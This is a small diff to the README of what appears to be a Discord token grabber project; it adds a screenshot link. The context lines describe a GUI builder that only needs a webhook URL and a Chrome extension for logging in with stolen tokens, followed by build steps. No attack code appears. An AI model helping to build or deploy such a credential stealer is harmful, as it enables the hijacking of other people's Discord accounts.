@@ -47,6 +47,9 @@ You can also use the [Discord Token Login Chrome Extention](https://github.com/g
 - You can download the gui builder from releases.
 - The GUI will only requires you to enter the webhook url. No need to edit the config.h file or anything else.
 
+![image](https://github.com/gastersaurus/C-Discord-Token-Logger-Grabber/assets/154365450/d52621b6-b1a2-451a-ade3-28c4d26bbd54)
+
+
 ## Building with Microsoft Visual Studio:
 ### Requirements:
 ##### Visual Studio 2019
